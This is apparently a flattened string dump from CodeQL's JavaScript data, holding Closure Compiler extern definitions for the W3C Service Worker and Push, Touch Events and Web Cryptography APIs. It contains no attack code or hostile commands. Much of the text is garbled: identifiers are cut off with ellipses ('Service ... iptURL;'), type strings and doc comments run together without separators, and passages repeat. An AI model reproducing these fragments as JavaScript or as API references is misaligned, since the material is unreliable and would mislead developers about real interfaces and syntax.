http://www.w3.org/TR/push-api/#idl-def-PushEvent
!ExtendableEventInit=!ExtendableEventInit?PushMessageDatahttp://www.w3.org/TR/service-workers/#service-worker-registration-interface
!PushManagerhttps://notifications.spec.whatwg.org/#service-worker-api
NotificationOptions=NotificationOptions!GetNotificationOptions=!GetNotificationOptionsGetNotificationOptions!Promise.<?Array.<?Notification>>Promise.<?Array.<?Notification>>?Array.<?Notification>Array.<?Notification>?NotificationNotificationhttp://www.w3.org/TR/service-workers/#service-worker-container-interface
?ServiceWorker!Promise.<!ServiceWorkerRegistration>Promise.<!ServiceWorkerRegistration>!ServiceWorkerRegistrationRegistrationOptions=!Promise.<(!ServiceWorkerRegistration|undefined)>Promise.<(!ServiceWorkerRegistration|undefined)>(!ServiceWorkerRegistration|undefined)!Promise.<Array.<!ServiceWorkerRegistration>>Promise.<Array.<!ServiceWorkerRegistration>>Array.<!ServiceWorkerRegistration>?function (!ErrorEvent)function (!ErrorEvent)!ErrorEvent{scope: (string|undefined), useCache: (boolean|undefined)}useCache!ServiceWorkerContainerhttp://www.w3.org/TR/service-workers/#service-worker-global-scope-interface
!Cache!CacheStorage!ServiceWorkerClients!Console?function (!InstallEvent)function (!InstallEvent)!InstallEvent?function (!ExtendableEvent)function (!ExtendableEvent)!ExtendableEvent?function (!FetchEvent)function (!FetchEvent)!FetchEventTODO(mtragut): This handler should get a custom event in the future.?function (!MessageEvent)function (!MessageEvent)!MessageEventhttp://www.w3.org/TR/service-workers/#service-worker-client-interface
// TODO(mtragut): Possibly replace the type with enum ContextFrameType once
the enum is defined.(!Array.<!Transferable>|undefined)=(!Array.<!Transferable>|undefined)http://www.w3.org/TR/service-workers/#service-worker-clients-interface
Deprecated in Chrome M43+, use matchAll instead. Reference:
https://github.com/slightlyoff/ServiceWorker/issues/610.
TODO(joeltine): Remove when getAll is fully deprecated.ServiceWorkerClientQueryOptions=!Promise.<!Array.<!ServiceWorkerClient>>Promise.<!Array.<!ServiceWorkerClient>>!Array.<!ServiceWorkerClient>Array.<!ServiceWorkerClient>!ServiceWorkerClient!Promise.<!ServiceWorkerClient>Promise.<!ServiceWorkerClient>{includeUncontrolled: (boolean|undefined)}includeUncontrolledhttp://www.w3.org/TR/service-workers/#cache-interface
CacheQueryOptions=!Promise.<(!Response|undefined)>Promise.<(!Response|undefined)>(!Response|undefined)RequestInfo=!Promise.<!Array.<!Response>>Promise.<!Array.<!Response>>!Array.<!Response>Array.<!Response>!Array.<!RequestInfo>Array.<!RequestInfo>!Promise.<!Array.<!Request>>Promise.<!Array.<!Request>>!Array.<!Request>Array.<!Request>{ignoreSearch: (boolean|undefined), ignoreMethod: (boolean|undefined), ignoreVary: (boolean|undefined), prefixMatch: (boolean|undefined), cacheName: (string|undefined)}ignoreSearchignoreMethodignoreVaryprefixMatchhttp://www.w3.org/TR/service-workers/#cache-storage-interface
Window instances have a property called caches which implements CacheStoragehttps://www.w3.org/TR/service-workers/#cache-objects
!Promise.<!Cache>Promise.<!Cache>!Promise.<!Array.<string>>Promise.<!Array.<string>>http://www.w3.org/TR/service-workers/#extendable-event-interface
ExtendableEventInit={bubbles: (boolean|undefined), cancelable: (boolean|undefined)}http://www.w3.org/TR/service-workers/#install-event-interface
InstallEventInit={bubbles: (boolean|undefined), cancelable: (boolean|undefined), activeWorker: (!ServiceWorker|undefined)}(!ServiceWorker|undefined)!ServiceWorkerhttp://www.w3.org/TR/service-workers/#fetch-event-interface
FetchEventInit=!boolean(Response|Promise.<Response>)Promise.<Response>{bubbles: (boolean|undefined), cancelable: (boolean|undefined), request: (!Request|undefined), client: (!ServiceWorkerClient|undefined), isReload: (!boolean|undefined)}(!Request|undefined)(!ServiceWorkerClient|undefined)(!boolean|undefined)Service ... iptURL;Service ... riptURLService ... ototypeService ... .state;Service ... e.stateService ... change;Service ... echangevar Ser ... State ;PushSub ... dpoint;PushSub ... ndpointPushSub ... ototypePushSub ... tionId;PushSub ... ptionIdPushSub ... n() {};PushSub ... on() {}PushSub ... bscribePushMan ... ns) {};PushMan ... ons) {}PushMan ... bscribePushMan ... ototypePushMan ... n() {};PushMan ... on() {}PushMan ... riptionvar Pus ... ptions;PushSub ... OptionsPushMes ... n() {};PushMes ... on() {}PushMes ... yBufferPushMes ... ototypePushMes ... pe.blobPushMes ... pe.jsonPushMes ... pe.textPushEve ... e.data;PushEve ... pe.dataPushEvent.prototypeService ... trationService ... alling;Service ... tallingService ... aiting;Service ... waitingService ... active;Service ... .activeService ... .scope;Service ... e.scopeService ... n() {};Service ... on() {}Service ... egisterService ... efound;Service ... tefoundService ... .updateService ... anager;Service ... ManagerService ... ns) {};Service ... ons) {}Service ... icationService ... er) {};Service ... ter) {}Service ... cationsService ... ntainerService ... roller;Service ... trollerService ... .ready;Service ... e.readyService ... RL) {};Service ... URL) {}functio ... URL) {}Service ... rationsService ... rchangeService ... nerror;Service ... onerrorvar Reg ... ptions;Navigat ... Worker;Navigat ... eWorkerService ... alScopeService ... tCache;Service ... ptCacheService ... caches;Service ... .cachesService ... lients;Service ... clientsService ... ration;Service ... WaitingService ... onsole;Service ... consoleService ... nstall;Service ... installService ... tivate;Service ... ctivateService ... nfetch;Service ... onfetchService ... victed;Service ... evictedService ... essage;Service ... messageService ... exedDB;Service ... dexedDBService ... hidden;Service ... .hiddenService ... ocused;Service ... focusedService ... yState;Service ... tyStateService ... pe.url;Service ... ype.urlService ... meType;Service ... ameTypeService ... fer) {}Service ... MessageService ... e.focusService ... .getAllService ... atchAllService ... e.claimService ... rl) {};Service ... url) {}Service ... nWindowvar Ser ... ptions;Service ... Optionsfunction Cache() {}Cache.p ... ns) {};Cache.p ... ons) {}Cache.p ... e.matchCache.prototypeCache.p ... atchAllCache.p ... st) {};Cache.p ... est) {}Cache.prototype.addfunction(request) {}Cache.p ... ts) {};Cache.p ... sts) {}Cache.p ... .addAllfunctio ... sts) {}Cache.p ... se) {};Cache.p ... nse) {}Cache.prototype.putfunctio ... nse) {}Cache.p ... .deleteCache.prototype.keysvar Cac ... ptions;Window. ... caches;Window. ... .cachesCacheSt ... ns) {};CacheSt ... ons) {}CacheSt ... e.matchCacheSt ... ototypeCacheSt ... me) {};CacheSt ... ame) {}CacheSt ... ype.hasCacheSt ... pe.openCacheSt ... .deleteCacheSt ... n() {};CacheSt ... on() {}CacheSt ... pe.keysExtenda ... (f) {};Extenda ... n(f) {}Extenda ... itUntilExtenda ... ototypefunction(f) {}var Ext ... ntInit;Extenda ... Worker;Extenda ... eWorkervar Ins ... ntInit;FetchEv ... equest;FetchEv ... requestFetchEvent.prototypeFetchEv ... client;FetchEv ... .clientFetchEv ... Reload;FetchEv ... sReloadFetchEv ... (r) {};FetchEv ... n(r) {}FetchEv ... ondWithfunction(r) {}FetchEv ... rl) {};FetchEv ... url) {}FetchEv ... rwardToFetchEv ... n() {};FetchEv ... on() {}FetchEv ... defaultvar FetchEventInit;H:/codeql/javascript/tools/data/externs/web/w3c_touch_event.js
 * @fileoverview Definitions for W3C's Touch Events specification.
 * @see http://www.w3.org/TR/touch-events/
 * @externs
 
 * @typedef {{
 *   identifier: number,
 *   target: !EventTarget,
 *   clientX: (number|undefined),
 *   clientY: (number|undefined),
 *   screenX: (number|undefined),
 *   screenY: (number|undefined),
 *   pageX: (number|undefined),
 *   pageY: (number|undefined),
 *   radiusX: (number|undefined),
 *   radiusY: (number|undefined),
 *   rotationAngle: (number|undefined),
 *   force: (number|undefined)
 * }}
 
 * The Touch class represents a single touch on the surface. A touch is the
 * presence or movement of a finger that is part of a unique multi-touch
 * sequence.
 * @see http://www.w3.org/TR/touch-events/#touch-interface
 * @param {!TouchInitDict} touchInitDict
 * @constructor
 
 * The x-coordinate of the touch's location relative to the window's viewport.
 * @type {number}
 
 * The y-coordinate of the touch's location relative to the window's viewport.
 * @type {number}
 
 * The unique identifier for this touch object.
 * @type {number}
 
 * The x-coordinate of the touch's location in page coordinates.
 * @type {number}
 
 * The y-coordinate of the touch's location in page coordinates.
 * @type {number}
 
 * The x-coordinate of the touch's location in screen coordinates.
 * @type {number}
 
 * The y-coordinate of the touch's location in screen coordinates.
 * @type {number}
 
 * The target of this touch.
 * @type {EventTarget}
 
 * @type {number}
 * @see http://www.w3.org/TR/touch-events-extensions/#widl-Touch-force
 
 * @type {number}
 * @see http://www.w3.org/TR/touch-events-extensions/#widl-Touch-radiusX
 /**\n *  ... usX\n */
 * @type {number}
 * @see http://www.w3.org/TR/touch-events-extensions/#widl-Touch-radiusY
 /**\n *  ... usY\n */
 * @type {number}
 * @see http://www.w3.org/TR/2011/WD-touch-events-20110505/#widl-Touch-rotationAngle
 
 * Creates a new Touch object.
 * @see http://www.w3.org/TR/touch-events/#widl-Document-createTouch-Touch-WindowProxy-view-EventTarget-target-long-identifier-long-pageX-long-pageY-long-screenX-long-screenY
 * @param {Window} view
 * @param {EventTarget} target
 * @param {number} identifier
 * @param {number} pageX
 * @param {number} pageY
 * @param {number} screenX
 * @param {number} screenY
 * @return {Touch}
 /**\n *  ... ch}\n */
 * The TouchList class is used to represent a collection of Touch objects.
 * @see http://www.w3.org/TR/touch-events/#touchlist-interface
 * @constructor
 * @implements {IArrayLike<!Touch>}
 /**\n *  ... h>}\n */
 * The number of Touch objects in this TouchList object.
 * @type {number}
 
 * Returns the Touch object at the given index.
 * @param {number} index
 * @return {?Touch}
 
 * @param {number} identifier
 * @return {?Touch}
 * @see http://www.w3.org/TR/touch-events-extensions/#widl-TouchList-identifiedTouch-Touch-long-identifier
 
 * Creates a new TouchList object.
 * @see http://www.w3.org/TR/touch-events/#widl-Document-createTouchList-TouchList-Touch-touches
 * @param {Array<?Touch>} touches
 * @return {TouchList}
 
 * @record
 * @extends {UIEventInit}
 /**\n *  ... it}\n */ @type {undefined|!Array<?Touch>} /** @ty ... ch>} */
 * The TouchEvent class encapsulates information about a touch event.
 *
 * <p>The system continually sends TouchEvent objects to an application as
 * fingers touch and move across a surface. A touch event provides a snapshot of
 * all touches during a multi-touch sequence, most importantly the touches that
 * are new or have changed for a particular target. A multi-touch sequence
 * begins when a finger first touches the surface. Other fingers may
 * subsequently touch the surface, and all fingers may move across the surface.
 * The sequence ends when the last of these fingers is lifted from the surface.
 * An application receives touch event objects during each phase of any touch.
 * </p>
 *
 * <p>The different types of TouchEvent objects that can occur are:
 * <ul>
 *   <li>touchstart - Sent when a finger for a given event touches the surface.
 *   <li>touchmove - Sent when a given event moves on the surface.
 *   <li>touchend - Sent when a given event lifts from the surface.
 *   <li>touchcancel - Sent when the system cancels tracking for the touch.
 * </ul>
 * TouchEvent objects are combined together to form high-level GestureEvent
 * objects that are also sent during a multi-touch sequence.</p>
 *
 * @see http://www.w3.org/TR/touch-events/#touchevent-interface
 * @param {string} type
 * @param {!TouchEventInit=} opt_eventInitDict
 * @extends {UIEvent}
 * @constructor
 
 * A collection of Touch objects representing all touches associated with this
 * target.
 * @type {TouchList}
 
 * A collection of Touch objects representing all touches that changed in this event.
 * @type {TouchList}
 
 * Specifies the JavaScript method to invoke when the system cancels tracking
 * for the touch.
 * @type {?function(!TouchEvent)}
 
 * Specifies the JavaScript method to invoke when a given event lifts from the
 * surface.
 * @type {?function(!TouchEvent)}
 
 * Specifies the JavaScript method to invoke when a finger for a given event
 * moves on the surface.
 * @type {?function(!TouchEvent)}
 
 * Specifies the JavaScript method to invoke when a finger for a given event
 * touches the surface.
 * @type {?function(!TouchEvent)}
 TouchInitDicttouchInitDictforcerotationAnglecreateTouchidentifiedTouchcreateTouchListTouchEventInitontouchcancelontouchendontouchmoveontouchstartDefinitions for W3C's Touch Events specification.
http://www.w3.org/TR/touch-events/
{identifier: number, target: !EventTarget, clientX: (number|undefined), clientY: (number|undefined), screenX: (number|undefined), screenY: (number|undefined), pageX: (number|undefined), pageY: (number|undefined), radiusX: (number|undefined), radiusY: (number|undefined), rotationAngle: (number|undefined), force: (number|undefined)}The Touch class represents a single touch on the surface. A touch is the
presence or movement of a finger that is part of a unique multi-touch
sequence.http://www.w3.org/TR/touch-events/#touch-interface
!TouchInitDictThe x-coordinate of the touch's location relative to the window's viewport.The y-coordinate of the touch's location relative to the window's viewport.The unique identifier for this touch object.The x-coordinate of the touch's location in page coordinates.The y-coordinate of the touch's location in page coordinates.The x-coordinate of the touch's location in screen coordinates.The y-coordinate of the touch's location in screen coordinates.The target of this touch.http://www.w3.org/TR/touch-events-extensions/#widl-Touch-forcehttp://www.w3.org/TR/touch-events-extensions/#widl-Touch-radiusXhttp://www.w3.org/TR/touch-events-extensions/#widl-Touch-radiusYhttp://www.w3.org/TR/2011/WD-touch-events-20110505/#widl-Touch-rotationAngleCreates a new Touch object.http://www.w3.org/TR/touch-events/#widl-Document-createTouch-Touch-WindowProxy-view-EventTarget-target-long-identifier-long-pageX-long-pageY-long-screenX-long-screenY
The TouchList class is used to represent a collection of Touch objects.http://www.w3.org/TR/touch-events/#touchlist-interface
IArrayLike.<!Touch>!TouchThe number of Touch objects in this TouchList object.Returns the Touch object at the given index.?Touchhttp://www.w3.org/TR/touch-events-extensions/#widl-TouchList-identifiedTouch-Touch-long-identifierCreates a new TouchList object.http://www.w3.org/TR/touch-events/#widl-Document-createTouchList-TouchList-Touch-touches
Array.<?Touch>(undefined|!Array.<?Touch>)!Array.<?Touch>The TouchEvent class encapsulates information about a touch event.

<p>The system continually sends TouchEvent objects to an application as
fingers touch and move across a surface. A touch event provides a snapshot of
all touches during a multi-touch sequence, most importantly the touches that
are new or have changed for a particular target. A multi-touch sequence
begins when a finger first touches the surface. Other fingers may
subsequently touch the surface, and all fingers may move across the surface.
The sequence ends when the last of these fingers is lifted from the surface.
An application receives touch event objects during each phase of any touch.
</p>

<p>The different types of TouchEvent objects that can occur are:
<ul>
<li>touchstart - Sent when a finger for a given event touches the surface.
<li>touchmove - Sent when a given event moves on the surface.
<li>touchend - Sent when a given event lifts from the surface.
<li>touchcancel - Sent when the system cancels tracking for the touch.
</ul>
TouchEvent objects are combined together to form high-level GestureEvent
objects that are also sent during a multi-touch sequence.</p>http://www.w3.org/TR/touch-events/#touchevent-interface
!TouchEventInit=!TouchEventInitA collection of Touch objects representing all touches associated with this
target.A collection of Touch objects representing all touches that changed in this event.Specifies the JavaScript method to invoke when the system cancels tracking
for the touch.?function (!TouchEvent)function (!TouchEvent)!TouchEventSpecifies the JavaScript method to invoke when a given event lifts from the
surface.Specifies the JavaScript method to invoke when a finger for a given event
moves on the surface.Specifies the JavaScript method to invoke when a finger for a given event
touches the surface.var TouchInitDict;Touch.p ... lientX;Touch.p ... clientXTouch.p ... lientY;Touch.p ... clientYTouch.p ... tifier;Touch.p ... ntifierTouch.p ... .pageX;Touch.p ... e.pageXTouch.p ... .pageY;Touch.p ... e.pageYTouch.p ... creenX;Touch.p ... screenXTouch.p ... creenY;Touch.p ... screenYTouch.p ... target;Touch.p ... .targetTouch.p ... .force;Touch.p ... e.forceTouch.p ... radiusXTouch.p ... radiusYTouch.p ... nAngle;Touch.p ... onAngleDocumen ... nY) {};Documen ... enY) {}Documen ... teTouchfunctio ... enY) {}TouchLi ... length;TouchLi ... .lengthTouchList.prototypeTouchLi ... ex) {};TouchLi ... dex) {}TouchLi ... pe.itemTouchLi ... er) {};TouchLi ... ier) {}TouchLi ... edTouchfunctio ... ier) {}Documen ... es) {};Documen ... hes) {}Documen ... uchListfunction(touches) {}TouchEv ... Target;TouchEv ... dTargetTouchEv ... ototypeTouchEv ... ouches;TouchEv ... touchesTouchEv ... TouchesTouchEv ... altKey;TouchEv ... .altKeyTouchEv ... etaKey;TouchEv ... metaKeyTouchEv ... trlKey;TouchEv ... ctrlKeyTouchEv ... iftKey;TouchEv ... hiftKeyElement ... cancel;Element ... hcancelElement ... uchend;Element ... ouchendElement ... chmove;Element ... uchmoveElement ... hstart;Element ... chstartH:/codeql/javascript/tools/data/externs/web/w3c_webcrypto.js
 * @fileoverview Definitions for W3C's Web Cryptography specification
 * http://www.w3.org/TR/webCryptoAPI
 * @externs
 * @author chrismoon@google.com (Chris Moon)
 * This file was created using the best practices as described in:
 *     chrome_extensions.js
 /**\n *  ... .js\n */
 * @const
 * @see http://www.w3.org/TR/webCryptoAPI
 
 * @typedef {?{
 *   name: string
 * }}
 * @see http://www.w3.org/TR/WebCryptoAPI/#algorithm-dictionary
 
 * @typedef {string|!webCrypto.Algorithm}
 * @see http://www.w3.org/TR/WebCryptoAPI/#dfn-AlgorithmIdentifier
 
 * @constructor
 * @see http://www.w3.org/TR/webCryptoAPI/#dfn-CryptoKey
 /**\n *  ... Key\n */
 * @type {string} An enumerated value representing the type of the key, a secret
 *    key (for symmetric algorithm), a public or a private key
 *    (for an asymmetric algorithm).
 /**\n *  ... m).\n */
 * @type {boolean} Determines whether or not the raw keying material may be
 *     exported by the application.
 /**\n *  ... on.\n */
 * @type {!Object} An opaque object representing a particular cipher the key
 *     has to be used with.
 /**\n *  ... th.\n */
 * @type {!Object} Returns the cached ECMAScript object associated with the
 *   usages internal slot, which indicates which cryptographic operations are
 *   permissible to be used with this key.
 /**\n *  ... ey.\n */
 * @typedef {?{
 *   name: string
 * }}
 * @see http://www.w3.org/TR/WebCryptoAPI/#key-algorithm-dictionary-members
 
 * @constructor
 * @see http://www.w3.org/TR/WebCryptoAPI/#dfn-JsonWebKey
 * @see Section 3.1:
 *     https://tools.ietf.org/html/draft-ietf-jose-json-web-key-41
 /**\n *  ... -41\n */
 * @type {string} Identifies the cryptographic algorithm family used with
 *     the key, such as "RSA" or "EC".
 /**\n *  ... C".\n */
 * @type {string} Identifies the intended use of the public key.
 
 * @type {!Array<string>} Identifies the operation(s) that the key is
 *     intended to be used for.
 /**\n *  ... or.\n */
 * @type {string} Identifies the algorithm intended for use with the key.
 
 * @type {boolean} Boolean to be used with kty values.
 
 * @type {string} Identifies the cryptographic curve used with the key.
 
 * @type {string} Contains the x coordinate for the elliptic curve point.
 
 * @type {string} Contains the y coordinate for the elliptic curve point.
 
 * @type {string} Contains the Elliptic Curve private key value.
 
 * @type {string} Contains the modulus value for the RSA public key.
 
 * @type {string} Contains the exponent value for the RSA public key.
 
 * @type {string} Contains the first prime factor.
 
 * @type {string} Contains the second prime factor.
 
 * @type {string} Contains the Chinese Remainder Theorem (CRT) exponent of
 *     the first factor.
 
 * @type {string} Contains the Chinese Remainder Theorem (CRT) exponent of
 *     the second factor.
 
 * @type {string} Contains the Chinese Remainder Theorem (CRT) coefficient
 *     of the second factor.
 
 * @type {!Array<!webCrypto.RsaOtherPrimesInfo>} Contains an array of
 *     information about any third and subsequent primes, should they exist.
 /**\n *  ... st.\n */
 * @type {string} Contains the value of the symmetric (or other
 *     single-valued) key.
 
 * @constructor
 * @see http://www.w3.org/TR/WebCryptoAPI/#dfn-RsaOtherPrimesInfo
 * @see Section-6.3.2.7:
 *     https://tools.ietf.org/html/draft-ietf-jose-json-web-algorithms-40
 /**\n *  ... -40\n */
 * @type {string} Parameter within an "oth" array member represents the value
 *     of a subsequent prime factor.
 
 * @type {string} Parameter within an "oth" array member represents the CRT
 *     exponent of the corresponding prime factor.
 
 * @type {string} Parameter within an "oth" array member represents the CRT
 *     coefficient of the corresponding prime factor.
 
 * @constructor
 * @see http://www.w3.org/TR/WebCryptoAPI/#subtlecrypto-interface
 
 * @param {!webCrypto.AlgorithmIdentifier} algorithm Supported
 *     values are: AES-CBC, AES-CTR, AES-GCM, and RSA-OAEP.
 * @param {!webCrypto.CryptoKey} key Key to be used for signing.
 * @param {!BufferSource} data Data to be encrypted (cleartext).
 * @return {!Promise<*>} Ciphertext generated by the encryption of the
 *     cleartext.
 /**\n *  ... xt.\n */
 * @param {!webCrypto.AlgorithmIdentifier} algorithm Supported
 *     values are: AES-CBC, AES-CTR, AES-GCM, and RSA-OAEP.
 * @param {!webCrypto.CryptoKey} key Key to be used for signing.
 * @param {!BufferSource} data Data to be decrypted (ciphertext).
 * @return {!Promise<*>} Cleartext generated by the decryption of the
 *     ciphertext.
 
 * @param {!webCrypto.AlgorithmIdentifier} algorithm Supported
 *     values are: HMAC, RSASSA-PKCS1-v1_5, and ECDSA.
 * @param {!webCrypto.CryptoKey} key Private key to be used for signing.
 * @param {!BufferSource} data Data to be signed.
 * @return {!Promise<*>} Returns the signature on success.
 /**\n *  ... ss.\n */
 * @param {!webCrypto.AlgorithmIdentifier} algorithm Supported
 *     values are: HMAC, RSASSA-PKCS1-v1_5, and ECDSA.
 * @param {!webCrypto.CryptoKey} key Private key to be used for signing.
 * @param {!BufferSource} signature Signature to verify.
 * @param {!BufferSource} data Data whose signature needs to be verified.
 * @return {!Promise<*>} Returns a boolean indicating if the signature operating
 *     has been successful.
 /**\n *  ... ul.\n */
 * @param {!webCrypto.AlgorithmIdentifier} algorithm Supported
 *     values are: SHA-1, SHA-256, SHA-384, and SHA-512.
 * @param {!BufferSource} data Data to be hashed using the hashing algorithm.
 * @return {!Promise<*>} returns the hash on success.
 
 * @param {!webCrypto.AlgorithmIdentifier} algorithm Supported
 *     values are: SHA-1, SHA-256, SHA-384, and SHA-512.
 * @param {boolean} extractable If the key can be extracted from the CryptoKey
 *     object at a later stage.
 * @param {!Array<string>} keyUsages Indication of new key options i.e.
 *     encrypt, decrypt, sign, verify, deriveKey, deriveBits, wrapKey,
 *     unwrapKey.
 * @return {!Promise<*>} returns the generated key as a CryptoKey or a
 *     CryptoKeyPair.
 /**\n *  ... ir.\n */
 * @param {!webCrypto.AlgorithmIdentifier} algorithm The key derivation
 *     algorithm to use. Supported values are:  ECDH, DH, PBKDF2, and HKDF-CTR.
 * @param {!webCrypto.CryptoKey} baseKey Key to be used by the key
 *     derivation algorithm.
 * @param {!webCrypto.AlgorithmIdentifier} derivedKeyAlgo Defines the key
 *     derivation algorithm to use.
 * @param {boolean} extractable Indicates if the key can be extracted from the
 *     CryptoKey object at a later stage.
 * @param {!Array<string>} keyUsages Indicates what can be done with the
 *     derivated key.
 * @return {!Promise<*>} returns the generated key as a CryptoKey or a
 *     CryptoKeyPair.
 
 * @param {!webCrypto.AlgorithmIdentifier} algorithm The key derivation
 *     algorithm to use.
 * @param {!webCrypto.CryptoKey} baseKey Key to be used by the key
 *     derivation algorithm.
 * @param {number} length
 * @return {!Promise<*>} returns the generated key as a CryptoKey or a
 *     CryptoKeyPair.
 
 * @param {string} format Enumerated value describing the data
 *     format of the key to imported.
 * @param {!BufferSource|!webCrypto.JsonWebKey} keyData The key
 *     in the given format.
 * @param {!webCrypto.AlgorithmIdentifier} algorithm Supported values
 *     are: AES-CTR, AES-CBC, AES-GCM, RSA-OAEP, AES-KW, HMAC,
 *     RSASSA-PKCS1-v1_5, ECDSA, ECDH, DH.
 * @param {boolean} extractable If the key can be extracted from the CryptoKey
 *     object at a later stage.
 * @param {!Array<string>} keyUsages Indication of new key options i.e.
 *     encrypt, decrypt, sign, verify, deriveKey, deriveBits, wrapKey,
 *     unwrapKey.
 * @return {!Promise<*>} returns the generated key as a CryptoKey.
 
 * @param {string} format Enumerated value describing the data
 *     format of the key to imported.
 * @param {!webCrypto.CryptoKey} key CryptoKey to export.
 * @return {!Promise<*>} returns the key in the requested format.
 /**\n *  ... at.\n */
 * @param {string} format Value describing the data format in which the key must
 *     be wrapped. It can be one of the following: raw, pkcs8, spki, jwk.
 * @param {!webCrypto.CryptoKey} key CryptoKey to wrap.
 * @param {!webCrypto.CryptoKey} wrappingKey CryptoKey used to perform
 *     the wrapping.
 * @param {!webCrypto.AlgorithmIdentifier} wrapAlgorithm algorithm used
 *     to perform the wrapping. It is one of the following: AES-CBC, AES-CTR,
 *     AES-GCM, RSA-OAEP, and AES-KW.
 * @return {!Promise<*>} returns the wrapped key in the requested format.
 
 * @param {string} format Value describing the data format in which the key must
 *     be wrapped. It can be one of the following: raw, pkcs8, spki, jwk.
 * @param {!BufferSource} wrappedKey Contains the wrapped key in the given
 *     format.
 * @param {!webCrypto.CryptoKey} unwrappingKey CryptoKey used to perform
 *     the unwrapping.
 * @param {!webCrypto.AlgorithmIdentifier} unwrapAlgorithm Algorithm
 *    used to perform the unwrapping. It is one of the following: AES-CBC,
 *    AES-CTR, AES-GCM, RSA-OAEP, and AES-KW.
 * @param {!webCrypto.AlgorithmIdentifier} unwrappedKeyAlgorithm
 *     Represents the algorithm of the wrapped key.
 * @param {boolean} extractable Indicates if the key can be extracted from the
 *     CryptoKey object at a later stage.
 * @param {!Array<string>} keyUsages Indicates what can be done with the
 *     derivated key.
 * @return {!Promise<*>} returns the unwrapped key as a CryptoKey.
 
 * Web Cryptography API
 * @see http://www.w3.org/TR/WebCryptoAPI/
 /**\n *  ... PI/\n */
 * @see https://developer.mozilla.org/en/DOM/window.crypto.getRandomValues
 * @param {!ArrayBufferView} typedArray
 * @return {!ArrayBufferView}
 * @throws {Error}
 
 * @type {webCrypto.SubtleCrypto}
 * @see http://www.w3.org/TR/WebCryptoAPI/#Crypto-attribute-subtle
 webCryptoAlgorithmAlgorithmIdentifierCryptoKeyextractableusagesKeyAlgorithmJsonWebKeyktyusekey_opsalgcrvdqdpdqqiothkRsaOtherPrimesInfotSubtleCryptoencryptdecryptgenerateKeykeyUsagesderiveKeybaseKeyderivedKeyAlgoderiveBitsimportKeykeyDataexportKeywrapKeywrappingKeywrapAlgorithmunwrapKeywrappedKeyunwrappingKeyunwrapAlgorithmunwrappedKeyAlgorithmgetRandomValuestypedArraysubtleDefinitions for W3C's Web Cryptography specification
http://www.w3.org/TR/webCryptoAPI
chrismoon@google.com (Chris Moon)
This file was created using the best practices as described in:
chrome_extensions.jshttp://www.w3.org/TR/webCryptoAPI?{name: string}{name: string}http://www.w3.org/TR/WebCryptoAPI/#algorithm-dictionary(string|!webCrypto.Algorithm)!webCrypto.AlgorithmwebCrypto.Algorithmhttp://www.w3.org/TR/WebCryptoAPI/#dfn-AlgorithmIdentifierhttp://www.w3.org/TR/webCryptoAPI/#dfn-CryptoKeyAn enumerated value representing the type of the key, a secret
key (for symmetric algorithm), a public or a private key
(for an asymmetric algorithm).Determines whether or not the raw keying material may be
exported by the application.An opaque object representing a particular cipher the key
has to be used with.Returns the cached ECMAScript object associated with the
usages internal slot, which indicates which cryptographic operations are
permissible to be used with this key.http://www.w3.org/TR/WebCryptoAPI/#key-algorithm-dictionary-membershttp://www.w3.org/TR/WebCryptoAPI/#dfn-JsonWebKey
Section 3.1:
https://tools.ietf.org/html/draft-ietf-jose-json-web-key-41Identifies the cryptographic algorithm family used with
the key, such as "RSA" or "EC".Identifies the intended use of the public key.Identifies the operation(s) that the key is
intended to be used for.Identifies the algorithm intended for use with the key.Boolean to be used with kty values.Identifies the cryptographic curve used with the key.Contains the x coordinate for the elliptic curve point.Contains the y coordinate for the elliptic curve point.Contains the Elliptic Curve private key value.Contains the modulus value for the RSA public key.Contains the exponent value for the RSA public key.Contains the first prime factor.Contains the second prime factor.Contains the Chinese Remainder Theorem (CRT) exponent of
the first factor.Contains the Chinese Remainder Theorem (CRT) exponent of
the second factor.Contains the Chinese Remainder Theorem (CRT) coefficient
of the second factor.Contains an array of
information about any third and subsequent primes, should they exist.!Array.<!webCrypto.RsaOtherPrimesInfo>Array.<!webCrypto.RsaOtherPrimesInfo>!webCrypto.RsaOtherPrimesInfowebCrypto.RsaOtherPrimesInfoContains the value of the symmetric (or other
single-valued) key.http://www.w3.org/TR/WebCryptoAPI/#dfn-RsaOtherPrimesInfo
Section-6.3.2.7:
https://tools.ietf.org/html/draft-ietf-jose-json-web-algorithms-40Parameter within an "oth" array member represents the value
of a subsequent prime factor.Parameter within an "oth" array member represents the CRT
exponent of the corresponding prime factor.Parameter within an "oth" array member represents the CRT
coefficient of the corresponding prime factor.http://www.w3.org/TR/WebCryptoAPI/#subtlecrypto-interfaceSupported
values are: AES-CBC, AES-CTR, AES-GCM, and RSA-OAEP.
!webCrypto.AlgorithmIdentifierwebCrypto.AlgorithmIdentifierKey to be used for signing.
!webCrypto.CryptoKeywebCrypto.CryptoKeyData to be encrypted (cleartext).
Ciphertext generated by the encryption of the
cleartext.Data to be decrypted (ciphertext).
Cleartext generated by the decryption of the
ciphertext.Supported
values are: HMAC, RSASSA-PKCS1-v1_5, and ECDSA.
Private key to be used for signing.
Data to be signed.
Returns the signature on success.Signature to verify.
Data whose signature needs to be verified.
Returns a boolean indicating if the signature operating
has been successful.Supported
values are: SHA-1, SHA-256, SHA-384, and SHA-512.
Data to be hashed using the hashing algorithm.
returns the hash on success.If the key can be extracted from the CryptoKey
object at a later stage.
Indication of new key options i.e.
encrypt, decrypt, sign, verify, deriveKey, deriveBits, wrapKey,
unwrapKey.
returns the generated key as a CryptoKey or a
CryptoKeyPair.The key derivation
algorithm to use. Supported values are:  ECDH, DH, PBKDF2, and HKDF-CTR.
Key to be used by the key
derivation algorithm.
Defines the key
derivation algorithm to use.
Indicates if the key can be extracted from the
CryptoKey object at a later stage.
Indicates what can be done with the
derivated key.
The key derivation
algorithm to use.
Enumerated value describing the data
format of the key to imported.
The key
in the given format.
(!BufferSource|!webCrypto.JsonWebKey)!webCrypto.JsonWebKeywebCrypto.JsonWebKeySupported values
are: AES-CTR, AES-CBC, AES-GCM, RSA-OAEP, AES-KW, HMAC,
RSASSA-PKCS1-v1_5, ECDSA, ECDH, DH.
returns the generated key as a CryptoKey.CryptoKey to export.
returns the key in the requested format.Value describing the data format in which the key must
be wrapped. It can be one of the following: raw, pkcs8, spki, jwk.
CryptoKey to wrap.
CryptoKey used to perform
the wrapping.
algorithm used
to perform the wrapping. It is one of the following: AES-CBC, AES-CTR,
AES-GCM, RSA-OAEP, and AES-KW.
returns the wrapped key in the requested format.Contains the wrapped key in the given
format.
CryptoKey used to perform
the unwrapping.
Algorithm
used to perform the unwrapping. It is one of the following: AES-CBC,
